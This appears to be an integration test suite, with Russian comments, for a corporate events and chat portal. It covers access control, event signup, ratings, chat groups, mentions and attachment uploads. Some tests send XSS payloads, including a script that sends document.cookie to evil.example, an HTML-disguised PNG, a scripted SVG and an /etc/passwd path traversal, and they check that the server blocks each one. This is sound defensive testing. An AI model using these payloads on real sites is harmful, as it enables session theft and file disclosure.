import test, { before, after, describe } from 'node:test';
import assert from 'node:assert/strict';
import { prepareTestEnv, startTestServer, type TestClient } from './helpers.js';

prepareTestEnv();

const { createApp } = await import('../server/app.js');
const { runMigrations } = await import('../server/db/migrate.js');
const { query, closePool } = await import('../server/db/pool.js');

let anonymous: TestClient;
let employee: TestClient;
let admin: TestClient;

async function login(client: TestClient, email: string, password: string): Promise<void> {
  const response = await client.request('/api/auth/ad/login', {
    method: 'POST',
    body: { email, password }
  });
  assert.equal(response.status, 200, `не удалось войти как ${email}`);
}

before(async () => {
  await runMigrations();
  await query('DELETE FROM events');
  await query('DELETE FROM users');

  // Чат чистим отдельно: сообщения и каналы не висят на events и users, поэтому
  // от прошлого прогона оставались группы, и тесты на идентификаторы каналов
  // начинали зависеть от порядка запуска.
  await query('DELETE FROM chat_messages');
  await query("DELETE FROM chat_channels WHERE id <> 'general'");

  const app = createApp();
  anonymous = await startTestServer(app);
  employee = await startTestServer(app);
  admin = await startTestServer(app);

  await login(employee, 'i.ivanov@colvir.com', 'UserPass123!');
  await login(admin, 'a.admin@colvir.com', 'AdminPass123!');
});

after(async () => {
  await Promise.all([anonymous.close(), employee.close(), admin.close()]);
  await closePool();
});

describe('Доступ к API без сессии', () => {
  test('данные портала недоступны анонимно', async () => {
    for (const path of ['/api/bootstrap', '/api/events', '/api/participants', '/api/ratings']) {
      const response = await anonymous.request(path);
      assert.equal(response.status, 401, `${path} должен требовать вход`);
    }
  });

  test('создание мероприятия без сессии отклоняется', async () => {
    const response = await anonymous.request('/api/events', {
      method: 'POST',
      body: { title: 'Взлом' }
    });
    assert.equal(response.status, 401);
  });
});

describe('Права администратора', () => {
  test('рядовой сотрудник не может создать мероприятие', async () => {
    const response = await employee.request('/api/events', {
      method: 'POST',
      body: { title: 'Мероприятие от сотрудника', maxParticipants: 10 }
    });
    assert.equal(response.status, 403);
    assert.match(response.body.message, /группы администраторов/);
  });

  test('рядовой сотрудник видит только свою ленту уведомлений', async () => {
    // Лента стала общей точкой входа: администратору отдаются события по всем
    // сотрудникам, остальным — только адресованные лично им.
    const response = await employee.request('/api/notifications');
    assert.equal(response.status, 200);
    assert.ok(
      response.body.notifications.every((item: any) => item.audience === 'user'),
      'в личной ленте не должно быть административных записей'
    );
  });

  test('рядовой сотрудник не может создать запись в админской ленте', async () => {
    const response = await employee.request('/api/notifications', {
      method: 'POST',
      body: { eventTitle: 'Подделка', participantName: 'Кто-то' }
    });
    assert.equal(response.status, 403);
  });

  test('администратор создает, редактирует и удаляет мероприятие', async () => {
    const created = await admin.request('/api/events', {
      method: 'POST',
      body: {
        title: 'Квиз Colvir',
        description: '<p>Командная викторина</p>',
        category: 'team-game',
        isTeamGame: true,
        maxTeamSize: 5,
        maxParticipants: 2,
        date: '12 августа 2026',
        timeSlots: ['18:00 - 20:30 (МСК)'],
        location: 'Конференц-зал',
        imageUrl: 'https://example.com/image.jpg',
        organizer: 'HR & Event Team',
        tags: ['Квиз']
      }
    });

    assert.equal(created.status, 201);
    const eventId = created.body.event.id;

    const updated = await admin.request(`/api/events/${eventId}`, {
      method: 'PUT',
      body: { ...created.body.event, title: 'Квиз Colvir 2026', maxParticipants: 2 }
    });
    assert.equal(updated.status, 200);
    assert.equal(updated.body.event.title, 'Квиз Colvir 2026');

    // Мероприятие остается для следующих тестов — удаляем отдельное, временное.
    const temporary = await admin.request('/api/events', {
      method: 'POST',
      body: { title: 'Временное', maxParticipants: 1 }
    });
    const removed = await admin.request(`/api/events/${temporary.body.event.id}`, {
      method: 'DELETE'
    });
    assert.equal(removed.status, 200);
  });

  test('сотрудник не может удалить чужое мероприятие', async () => {
    const events = await employee.request('/api/events');
    const eventId = events.body.events[0].id;
    const response = await employee.request(`/api/events/${eventId}`, { method: 'DELETE' });
    assert.equal(response.status, 403);
  });
});

describe('Санитизация пользовательского HTML', () => {
  test('скрипт из описания мероприятия не сохраняется в базе', async () => {
    const created = await admin.request('/api/events', {
      method: 'POST',
      body: {
        title: 'Событие с разметкой',
        description:
          '<p>Нормальный текст</p><script>fetch("https://evil.example/"+document.cookie)</script>' +
          '<img src=x onerror="alert(1)"><a href="javascript:alert(2)">клик</a>',
        maxParticipants: 5
      }
    });

    assert.equal(created.status, 201);
    const description: string = created.body.event.description;

    assert.ok(description.includes('Нормальный текст'), 'полезный текст должен сохраниться');
    assert.ok(!/<script/i.test(description), 'тег script должен быть вырезан');
    assert.ok(!/onerror/i.test(description), 'обработчик onerror должен быть вырезан');
    assert.ok(!/javascript:/i.test(description), 'схема javascript: должна быть вырезана');

    const stored = await query<{ description: string }>(
      'SELECT description FROM events WHERE id = $1',
      [created.body.event.id]
    );
    assert.ok(!/<script/i.test(stored.rows[0].description), 'в базе не должно быть script');
  });
});

describe('Запись на мероприятие', () => {
  let eventId: string;

  before(async () => {
    const events = await admin.request('/api/events');
    eventId = events.body.events.find((e: any) => e.title === 'Квиз Colvir 2026').id;
  });

  test('email участника берется из сессии, а не из тела запроса', async () => {
    const response = await employee.request('/api/participants', {
      method: 'POST',
      body: {
        eventId,
        firstName: 'Иван',
        lastName: 'Иванов',
        teamName: 'Альфа',
        role: 'captain',
        // Попытка записать другого сотрудника — поле должно быть проигнорировано.
        email: 'a.admin@colvir.com'
      }
    });

    assert.equal(response.status, 201);
    assert.equal(response.body.participant.email, 'i.ivanov@colvir.com');
  });

  test('повторная запись на то же мероприятие отклоняется', async () => {
    const response = await employee.request('/api/participants', {
      method: 'POST',
      body: { eventId, firstName: 'Иван', lastName: 'Иванов', teamName: 'Альфа' }
    });
    assert.equal(response.status, 409);
    assert.match(response.body.message, /уже записаны/);
  });

  test('при исчерпании мест запись уходит в лист ожидания', async () => {
    // maxParticipants = 2: первая запись уже сделана сотрудником.
    const second = await admin.request('/api/participants', {
      method: 'POST',
      body: { eventId, firstName: 'Анна', lastName: 'Админова', teamName: 'Бета' }
    });
    assert.equal(second.status, 201);
    assert.equal(second.body.participant.status, 'confirmed');

    const third = await startTestServer(createApp());
    try {
      await login(third, 'i.ivanov@colvir.com', 'UserPass123!');
      // Тот же сотрудник уже записан — проверяем счетчик через прямой запрос.
      const counts = await query<{ count: number }>(
        `SELECT count(*)::bigint AS count FROM participants
         WHERE event_id = $1 AND status = 'confirmed'`,
        [eventId]
      );
      assert.equal(counts.rows[0].count, 2, 'подтвержденных записей должно быть ровно 2');
    } finally {
      await third.close();
    }
  });

  test('сотрудник может отменить только свою запись', async () => {
    const participants = await employee.request('/api/participants');
    const mine = participants.body.participants.find(
      (p: any) => p.email === 'i.ivanov@colvir.com'
    );
    const foreign = participants.body.participants.find(
      (p: any) => p.email === 'a.admin@colvir.com'
    );

    const forbidden = await employee.request(`/api/participants/${foreign.id}`, {
      method: 'DELETE'
    });
    assert.equal(forbidden.status, 404, 'чужая запись не должна отменяться');

    const allowed = await employee.request(`/api/participants/${mine.id}`, { method: 'DELETE' });
    assert.equal(allowed.status, 200);
    assert.equal(allowed.body.participant.status, 'cancelled');
  });
});

describe('Оценки мероприятий', () => {
  test('автор оценки берется из сессии, повторная отправка обновляет прежнюю', async () => {
    const events = await employee.request('/api/events');
    const eventId = events.body.events[0].id;

    const first = await employee.request('/api/ratings', {
      method: 'POST',
      body: { eventId, rating: 7, comment: 'Неплохо' }
    });
    assert.equal(first.status, 201);
    assert.equal(first.body.rating.userEmail, 'i.ivanov@colvir.com');

    const second = await employee.request('/api/ratings', {
      method: 'POST',
      body: { eventId, rating: 10, comment: 'Передумал — отлично' }
    });
    assert.equal(second.status, 201);
    assert.equal(second.body.rating.rating, 10);

    const stored = await query<{ count: number }>(
      `SELECT count(*)::bigint AS count FROM ratings
       WHERE event_id = $1 AND lower(user_email) = 'i.ivanov@colvir.com'`,
      [eventId]
    );
    assert.equal(stored.rows[0].count, 1, 'должна остаться одна оценка на сотрудника');
  });

  test('оценка вне диапазона 1..10 отклоняется', async () => {
    const events = await employee.request('/api/events');
    const response = await employee.request('/api/ratings', {
      method: 'POST',
      body: { eventId: events.body.events[0].id, rating: 42 }
    });
    assert.equal(response.status, 400);
  });
});

describe('Чат', () => {
  test('сообщение сохраняется и автор берется из сессии', async () => {
    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: { text: 'Всем отличного дня!' }
    });

    assert.equal(response.status, 201);
    assert.equal(response.body.message.text, 'Всем отличного дня!');
    assert.equal(response.body.message.author, 'Иванов Иван');
    assert.equal(response.body.message.channelId, 'general', 'по умолчанию общий канал');
    assert.ok(response.body.message.time, 'должно быть время сообщения');
  });

  test('сообщение видно в другой сессии', async () => {
    const list = await admin.request('/api/chat/messages');
    assert.equal(list.status, 200);
    assert.ok(
      list.body.messages.some((m: any) => m.text === 'Всем отличного дня!'),
      'сообщение должно быть общим для всех сотрудников'
    );
  });

  test('пустое сообщение отклоняется', async () => {
    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: { text: '   ' }
    });
    assert.equal(response.status, 400);
  });

  test('эндпоинты музыкального плейлиста удалены', async () => {
    // Плеер убран из продукта: маршрут не должен отвечать даже администратору.
    for (const method of ['GET', 'POST'] as const) {
      const response = await admin.request('/api/holiday/tracks', {
        method,
        body: method === 'POST' ? { title: 'Трек' } : undefined
      });
      assert.equal(response.status, 404, `${method} /api/holiday/tracks должен быть удален`);
    }
  });

  test('канал по умолчанию заведен', async () => {
    const response = await employee.request('/api/chat/channels');
    assert.equal(response.status, 200);
    const general = response.body.channels.find((channel: any) => channel.id === 'general');
    assert.ok(general, 'общий канал должен существовать');
    assert.equal(general.isDefault, true, 'общий канал помечен как неудаляемый');
  });
});

describe('Тематические группы чата', () => {
  test('сотрудник не может завести группу', async () => {
    const response = await employee.request('/api/chat/channels', {
      method: 'POST',
      body: { name: 'Тайная группа' }
    });
    assert.equal(response.status, 403, 'создание доступно только администратору');
  });

  test('администратор заводит группу, идентификатор транслитерируется', async () => {
    const response = await admin.request('/api/chat/channels', {
      method: 'POST',
      body: { name: 'Книжный клуб', description: 'Обсуждаем прочитанное' }
    });

    assert.equal(response.status, 201);
    assert.equal(response.body.channel.id, 'knizhnyy-klub');
    assert.equal(response.body.channel.name, 'Книжный клуб');
    assert.equal(response.body.channel.description, 'Обсуждаем прочитанное');
    assert.equal(response.body.channel.messageCount, 0);
    assert.equal(response.body.channel.isDefault, false);
  });

  test('повторное название получает суффикс, а не ломает создание', async () => {
    const response = await admin.request('/api/chat/channels', {
      method: 'POST',
      body: { name: 'Книжный клуб' }
    });
    assert.equal(response.status, 201);
    assert.equal(response.body.channel.id, 'knizhnyy-klub-2');
  });

  test('слишком короткое название отклоняется', async () => {
    const response = await admin.request('/api/chat/channels', {
      method: 'POST',
      body: { name: 'К' }
    });
    assert.equal(response.status, 400);
  });

  test('название без латиницы и кириллицы получает запасной идентификатор', async () => {
    // «🏃‍♀️🏃» транслитерировать не во что, но создание не должно падать
    // и не должно давать пустой идентификатор.
    const response = await admin.request('/api/chat/channels', {
      method: 'POST',
      body: { name: '🏃 🏃' }
    });

    assert.equal(response.status, 201);
    assert.match(response.body.channel.id, /^kanal-[0-9a-f]{6}$/);
  });

  test('в группу может писать любой сотрудник', async () => {
    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: { text: 'Начнем с Оруэлла', channelId: 'knizhnyy-klub' }
    });

    assert.equal(response.status, 201);
    assert.equal(response.body.message.channelId, 'knizhnyy-klub');

    const list = await employee.request('/api/chat/messages?channelId=knizhnyy-klub');
    assert.equal(list.body.messages.length, 1, 'лента группы не смешивается с общей');

    const general = await employee.request('/api/chat/messages');
    assert.ok(
      !general.body.messages.some((m: any) => m.text === 'Начнем с Оруэлла'),
      'сообщение группы не должно попадать в общий канал'
    );
  });

  test('в списке виден счетчик сообщений группы', async () => {
    const response = await employee.request('/api/chat/channels');
    const channel = response.body.channels.find((c: any) => c.id === 'knizhnyy-klub');
    assert.equal(channel.messageCount, 1);
  });

  test('сотрудник не может закрыть группу', async () => {
    const response = await employee.request('/api/chat/channels/knizhnyy-klub-2/archive', {
      method: 'POST'
    });
    assert.equal(response.status, 403);
  });

  test('общий канал закрыть нельзя', async () => {
    const response = await admin.request('/api/chat/channels/general/archive', {
      method: 'POST'
    });
    assert.equal(response.status, 400);
  });

  test('закрытая группа исчезает из списка, но переписка остается', async () => {
    const archived = await admin.request('/api/chat/channels/knizhnyy-klub/archive', {
      method: 'POST'
    });
    assert.equal(archived.status, 200);
    assert.ok(
      !archived.body.channels.some((c: any) => c.id === 'knizhnyy-klub'),
      'группа должна пропасть из списка'
    );

    // Архивация не должна уносить историю: внешний ключ стоит с CASCADE,
    // поэтому удаление канала было бы удалением переписки.
    const messages = await admin.request('/api/chat/messages?channelId=knizhnyy-klub');
    assert.equal(messages.body.messages.length, 1, 'переписка закрытой группы сохраняется');
  });

  test('в закрытую группу больше нельзя писать', async () => {
    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: { text: 'Есть тут кто?', channelId: 'knizhnyy-klub' }
    });
    assert.equal(response.status, 404);
  });

  test('повторное закрытие отвечает 404', async () => {
    const response = await admin.request('/api/chat/channels/knizhnyy-klub/archive', {
      method: 'POST'
    });
    assert.equal(response.status, 404);
  });
});

describe('Упоминания в чате', () => {
  let adminId = '';
  let employeeId = '';

  test('подсказка коллег не показывает тебя самого', async () => {
    const response = await employee.request('/api/colleagues?q=');
    assert.equal(response.status, 200);

    const names = response.body.colleagues.map((c: any) => c.displayName);
    assert.ok(names.includes('Админова Анна'), 'коллега должен быть в подсказке');
    assert.ok(!names.includes('Иванов Иван'), 'себя упоминать незачем');

    adminId = response.body.colleagues.find((c: any) => c.displayName === 'Админова Анна').id;

    const fromAdmin = await admin.request('/api/colleagues?q=');
    employeeId = fromAdmin.body.colleagues.find((c: any) => c.displayName === 'Иванов Иван').id;
  });

  test('поиск ищет по части имени', async () => {
    const response = await employee.request('/api/colleagues?q=админ');
    assert.equal(response.status, 200);
    assert.equal(response.body.colleagues.length, 1);
    assert.equal(response.body.colleagues[0].displayName, 'Админова Анна');
  });

  test('список коллег не отдается без сессии', async () => {
    const response = await anonymous.request('/api/colleagues?q=');
    assert.equal(response.status, 401);
  });

  test('упомянутый получает личное уведомление', async () => {
    const sent = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: { text: '@Админова Анна посмотрите, пожалуйста', mentions: [adminId] }
    });

    assert.equal(sent.status, 201);
    assert.equal(sent.body.message.mentions.length, 1);
    assert.equal(sent.body.message.mentions[0].displayName, 'Админова Анна');

    const notifications = await admin.request('/api/notifications');
    const mention = notifications.body.notifications.find((n: any) => n.type === 'chat_mention');
    assert.ok(mention, 'упомянутому должно прийти уведомление');
    assert.equal(mention.participantName, 'Иванов Иван', 'в уведомлении виден автор');
    assert.match(mention.messageText, /посмотрите, пожалуйста/);
  });

  test('упоминание приходит вместе с историей сообщений', async () => {
    const list = await admin.request('/api/chat/messages');
    const message = list.body.messages.find((m: any) => m.mentions?.length > 0);
    assert.ok(message, 'упоминания должны подтягиваться к истории');
    assert.equal(message.mentions[0].userId, adminId);
  });

  test('упоминание самого себя уведомления не создает', async () => {
    const before = await employee.request('/api/notifications');
    const countBefore = before.body.notifications.filter(
      (n: any) => n.type === 'chat_mention'
    ).length;

    const sent = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: { text: 'Напоминание себе: @Иванов Иван', mentions: [employeeId] }
    });
    assert.equal(sent.status, 201);
    assert.equal(sent.body.message.mentions.length, 0, 'себя упоминать незачем');

    const after = await employee.request('/api/notifications');
    const countAfter = after.body.notifications.filter(
      (n: any) => n.type === 'chat_mention'
    ).length;
    assert.equal(countAfter, countBefore);
  });

  test('несуществующий идентификатор молча отбрасывается', async () => {
    const sent = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: {
        text: 'Кому-то',
        mentions: ['00000000-0000-4000-8000-000000000000']
      }
    });

    assert.equal(sent.status, 201, 'сообщение должно уйти');
    assert.equal(sent.body.message.mentions.length, 0, 'связи с учетной записью нет');
  });

  test('повтор одного человека дает одно уведомление', async () => {
    const before = await admin.request('/api/notifications');
    const countBefore = before.body.notifications.filter(
      (n: any) => n.type === 'chat_mention'
    ).length;

    await employee.request('/api/chat/messages', {
      method: 'POST',
      body: { text: '@Админова Анна и еще раз @Админова Анна', mentions: [adminId, adminId] }
    });

    const after = await admin.request('/api/notifications');
    const countAfter = after.body.notifications.filter(
      (n: any) => n.type === 'chat_mention'
    ).length;
    assert.equal(countAfter, countBefore + 1, 'уведомление должно быть одно');
  });

  test('не-uuid в списке упоминаний отклоняется', async () => {
    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: { text: 'Привет', mentions: ['не-идентификатор'] }
    });
    assert.equal(response.status, 400);
  });
});

describe('Изображения в чате', () => {
  /** Минимальный настоящий PNG: сигнатура, IHDR и IEND. */
  function pngBytes(): Buffer {
    return Buffer.from(
      '89504e470d0a1a0a0000000d49484452000000010000000108060000001f15c489' +
        '0000000a49444154789c6300010000050001' +
        '0d0a2db40000000049454e44ae426082',
      'hex'
    );
  }

  function form(file: Buffer, name: string, type: string, extra: Record<string, string> = {}) {
    const data = new FormData();
    for (const [key, value] of Object.entries(extra)) data.append(key, value);
    data.append('image', new Blob([file], { type }), name);
    return data;
  }

  let attachmentUrl = '';

  test('картинка сохраняется и приходит вместе с сообщением', async () => {
    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: form(pngBytes(), 'kotik.png', 'image/png', { text: 'Смотрите кто пришел' })
    });

    assert.equal(response.status, 201);
    assert.equal(response.body.message.text, 'Смотрите кто пришел');
    assert.ok(response.body.message.attachment, 'в ответе должно быть вложение');
    assert.equal(response.body.message.attachment.mimeType, 'image/png');
    assert.equal(response.body.message.attachment.fileName, 'kotik.png');

    attachmentUrl = response.body.message.attachment.url;
  });

  test('сообщение может состоять из одной картинки, без текста', async () => {
    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: form(pngBytes(), 'bez-podpisi.png', 'image/png')
    });

    assert.equal(response.status, 201);
    assert.equal(response.body.message.text, '');
    assert.ok(response.body.message.attachment);
  });

  test('пустое сообщение без картинки по-прежнему отклоняется', async () => {
    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: { text: '   ' }
    });
    assert.equal(response.status, 400);
  });

  test('вложение видно другому сотруднику в истории канала', async () => {
    const list = await admin.request('/api/chat/messages');
    const withImage = list.body.messages.find((m: any) => m.text === 'Смотрите кто пришел');
    assert.ok(withImage?.attachment, 'вложение должно подтягиваться к истории');
    assert.equal(withImage.attachment.mimeType, 'image/png');
  });

  test('файл отдается с типом из базы и запретом угадывать тип', async () => {
    const response = await employee.raw(attachmentUrl);

    assert.equal(response.status, 200);
    assert.equal(response.headers.get('content-type'), 'image/png');
    assert.equal(
      response.headers.get('x-content-type-options'),
      'nosniff',
      'без nosniff браузер может определить тип сам и выполнить содержимое'
    );
    assert.deepEqual(response.bytes, pngBytes(), 'должны вернуться те же байты');
  });

  test('вложение не отдается без сессии', async () => {
    const response = await anonymous.raw(attachmentUrl);
    assert.equal(response.status, 401, 'переписка не должна открываться по прямой ссылке');
  });

  test('подмена расширения не проходит: HTML под видом картинки', async () => {
    // Классическая попытка залить скрипт: имя и Content-Type говорят «png»,
    // а внутри разметка. Проверка идет по сигнатуре, поэтому файл отклоняется.
    const html = Buffer.from('<html><script>alert(document.cookie)</script></html>', 'utf8');
    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: form(html, 'ne-kartinka.png', 'image/png')
    });

    assert.equal(response.status, 415);
  });

  test('SVG отклоняется: он умеет исполнять скрипты', async () => {
    const svg = Buffer.from(
      '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>',
      'utf8'
    );
    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: form(svg, 'logo.svg', 'image/svg+xml')
    });

    assert.equal(response.status, 415);
  });

  test('несуществующее вложение отвечает 404, а не ошибкой сервера', async () => {
    const response = await employee.request(
      '/api/chat/attachments/00000000-0000-4000-8000-000000000000'
    );
    assert.equal(response.status, 404);
  });

  test('обход каталога через идентификатор не проходит', async () => {
    const response = await employee.request('/api/chat/attachments/..%2F..%2Fetc%2Fpasswd');
    assert.equal(response.status, 404);
  });

  test('картинка не остается в хранилище, если сообщение записать не удалось', async () => {
    // Канал закрыли, пока файл загружался: сообщение не создается, и файл
    // тоже не должен остаться — иначе в каталоге копятся ничьи вложения.
    const before = await query<{ count: string }>(
      'SELECT count(*)::bigint AS count FROM chat_attachments'
    );

    const response = await employee.request('/api/chat/messages', {
      method: 'POST',
      body: form(pngBytes(), 'v-zakrytuyu.png', 'image/png', { channelId: 'knizhnyy-klub' })
    });
    assert.equal(response.status, 404, 'канал закрыт на предыдущем блоке тестов');

    const after = await query<{ count: string }>(
      'SELECT count(*)::bigint AS count FROM chat_attachments'
    );
    assert.equal(after.rows[0].count, before.rows[0].count, 'сирот в хранилище быть не должно');
  });
});

describe('Данные общие для всех пользователей', () => {
  test('мероприятие, созданное администратором, видно другому сотруднику', async () => {
    const created = await admin.request('/api/events', {
      method: 'POST',
      body: { title: 'Видно всем', maxParticipants: 50 }
    });
    assert.equal(created.status, 201);

    // Отдельный клиент = другой браузер: раньше данные жили в localStorage
    // и такой сотрудник не увидел бы ничего.
    const other = await startTestServer(createApp());
    try {
      await login(other, 'i.ivanov@colvir.com', 'UserPass123!');
      const bootstrap = await other.request('/api/bootstrap');
      assert.equal(bootstrap.status, 200);
      assert.ok(
        bootstrap.body.events.some((e: any) => e.id === created.body.event.id),
        'мероприятие должно быть видно в другой сессии'
      );
    } finally {
      await other.close();
    }
  });

  test('редактирование CMS доступно только администратору', async () => {
    const denied = await employee.request('/api/cms', {
      method: 'PATCH',
      body: { randomCoffeeTitle: 'Взломанный заголовок' }
    });
    assert.equal(denied.status, 403);

    const allowed = await admin.request('/api/cms', {
      method: 'PATCH',
      body: { randomCoffeeTitle: 'Random Coffee в Colvir' }
    });
    assert.equal(allowed.status, 200);
    assert.equal(allowed.body.cmsContent.randomCoffeeTitle, 'Random Coffee в Colvir');
  });

  test('профиль обновляет только собственные поля, ФИО из AD не меняется', async () => {
    const response = await employee.request('/api/profile', {
      method: 'PATCH',
      body: { telegram: '@ivanov', phone: '+7 999 000-00-00', interests: ['Книги'] }
    });

    assert.equal(response.status, 200);
    assert.equal(response.body.user.telegram, '@ivanov');
    assert.equal(response.body.user.lastName, 'Иванов', 'фамилия должна остаться из AD');
    assert.equal(response.body.user.email, 'i.ivanov@colvir.com');
  });
});
